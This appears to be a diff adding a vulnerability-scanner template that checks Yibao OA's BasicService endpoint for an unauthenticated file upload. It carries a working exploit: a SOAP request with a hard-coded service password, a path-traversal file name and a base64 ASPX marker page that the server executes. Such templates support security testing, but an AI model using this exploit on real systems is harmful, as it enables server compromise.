@@ -1,0 +1,43 @@
+id: yibao-basicservice-upload
+
+info:
+  name: Yibao OA BasicService - File Upload
+  author: qwtd
+  severity: critical
+  description: Yibao OA System is vulnerable to file upload.
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: product="顶讯科技-易宝OA系统"
+  tags: 易宝OA
+
+http:
+  - raw:
+      - |
+        POST /WebService/BasicService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        SOAPAction: "http://tempuri.org/GetStreamID"
+        Content-Length: 85
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <UploadPersonalFile xmlns="http://tempuri.org/">
+        <fs>PCVAUGFnZSBMYW5ndWFnZT0iQyMiJT4KPCUKUmVzcG9uc2UuV3JpdGUoRm9ybXNBdXRoZW50aWNhdGlvbi5IYXNoUGFzc3dvcmRGb3JTdG9yaW5nSW5Db25maWdGaWxlKCJ0ZXN0MTIzIiwgIk1ENSIpKTsKU3lzdGVtLklPLkZpbGUuRGVsZXRlKFJlcXVlc3QuUGh5c2ljYWxQYXRoKTsKJT4=</fs>
+        <FileName>../../manager/123.aspx</FileName>
+        <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>
+        </UploadPersonalFile>
+        </soap:Body>
+        </soap:Envelope>
+      - |
+        GET /123.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && contains(body_1, "UploadPersonalFileResponse")'
+          - 'status_code_2 == 200 && contains(body_2, "CC03E747A6AFBBCBF8BE7668ACFEBEE5")'
